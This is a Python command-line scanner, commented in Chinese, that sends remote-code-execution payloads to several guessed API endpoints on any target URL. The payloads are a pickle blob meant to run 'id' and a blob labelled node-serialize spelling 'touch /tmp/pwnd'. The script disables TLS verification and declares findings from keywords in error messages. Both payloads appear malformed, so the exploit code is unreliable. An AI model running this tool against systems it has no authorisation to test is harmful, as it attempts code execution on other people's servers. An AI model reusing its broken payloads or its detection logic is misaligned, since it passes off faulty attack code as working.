#!/usr/bin/env python3
"""反序列化探针 — node-serialize / pickle / yaml RCE 检测"""
import json, urllib.request, urllib.error, ssl, sys, argparse, time

ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = False
UA = "Deser-Probe/1.0"

NODE_SERIALIZE = b'\x83\xa5_rce\xac\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x70\x77\x6e\x64'
PYTHON_PICKLE = b'\x80\x04\x95\x1e\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x8c\x06system\x8c\x02id\x86\x94.'

def probe(url, payload, payload_type, content_type="application/octet-stream"):
    try:
        r = urllib.request.Request(url, data=payload, headers={"User-Agent": UA, "Content-Type": content_type}, method="POST")
        resp = urllib.request.urlopen(r, timeout=6, context=ctx)
        body = resp.read().decode(errors="replace")
        if "error" in body.lower() or "exception" in body.lower():
            return "POTENTIAL — error suggests deserialization attempted"
        return f"Unknown — status {resp.status}"
    except urllib.error.HTTPError as e:
        body = e.read().decode(errors="replace")
        if "serialize" in body.lower() or "deseri" in body.lower() or "unserialize" in body.lower():
            return "CONFIRMED — serialization error exposed"
        return f"Rejected — status {e.code}"
    except Exception as e:
        return f"Error: {e}"

def quick_scan(base):
    endpoints = [
        ("/api/parse", NODE_SERIALIZE, "node-serialize", "application/json"),
        ("/api/deserialize", NODE_SERIALIZE, "node-serialize", "application/octet-stream"),
        ("/api/import", PYTHON_PICKLE, "python-pickle", "application/octet-stream"),
        ("/api/load", PYTHON_PICKLE, "python-pickle", "application/octet-stream"),
        ("/api/data", NODE_SERIALIZE, "node-serialize", "application/octet-stream"),
    ]
    findings = []
    for path, payload, ptype, ct in endpoints:
        url = base.rstrip("/") + path
        result = probe(url, payload, ptype, ct)
        if "POTENTIAL" in result or "CONFIRMED" in result:
            findings.append({"endpoint": path, "type": ptype, "result": result})
    return findings

if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("url")
    args = p.parse_args()
    findings = quick_scan(args.url)
    print(json.dumps({"target": args.url, "findings": findings, "total": len(findings)}, ensure_ascii=False, indent=2))
